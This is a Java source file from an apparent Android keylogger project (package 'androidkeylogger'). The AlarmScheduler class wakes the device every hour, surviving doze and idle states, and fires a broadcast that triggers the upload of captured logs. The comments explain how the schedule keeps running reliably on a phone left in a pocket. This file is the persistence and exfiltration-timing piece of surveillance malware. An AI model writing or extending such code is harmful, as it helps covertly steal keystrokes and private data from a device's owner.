package com.bshu2.androidkeylogger;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * Durable hourly trigger. A Handler.postDelayed chain dies as soon as the
 * looper stops getting scheduled work (doze, frozen process), which is exactly
 * what happens to a phone that sits in a pocket for an hour. AlarmManager
 * survives that: the alarm is held by the system and wakes us with a
 * RTC_WAKEUP broadcast.
 *
 * setAndAllowWhileIdle is used instead of setExactAndAllowWhileIdle on purpose:
 * exact alarms need SCHEDULE_EXACT_ALARM on API 31+, and an hourly log upload
 * does not need to land on a precise millisecond.
 */
final class AlarmScheduler {

    private static final String TAG = UploadPipeline.TAG;
    private static final int REQUEST_CODE = 4021;

    private AlarmScheduler() {
    }

    static void schedule(Context ctx) {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) {
            Log.e(TAG, "no AlarmManager; automatic uploads disabled");
            return;
        }
        long interval = BuildConfig.UPLOAD_INTERVAL_MS;
        long triggerAt = System.currentTimeMillis() + interval;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pending(ctx));
            } else {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, pending(ctx));
            }
            Log.d(TAG, "alarm armed in " + interval + "ms");
        } catch (Exception e) {
            Log.e(TAG, "could not arm alarm", e);
        }
    }

    static void cancel(Context ctx) {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;
        try {
            am.cancel(pending(ctx));
        } catch (Exception e) {
            Log.e(TAG, "could not cancel alarm", e);
        }
    }

    private static PendingIntent pending(Context ctx) {
        Intent intent = new Intent(ctx, UploadReceiver.class);
        intent.setAction(UploadReceiver.ACTION_UPLOAD);
        // FLAG_IMMUTABLE only exists from API 23; below that the flag is absent.
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        return PendingIntent.getBroadcast(ctx, REQUEST_CODE, intent, flags);
    }
}
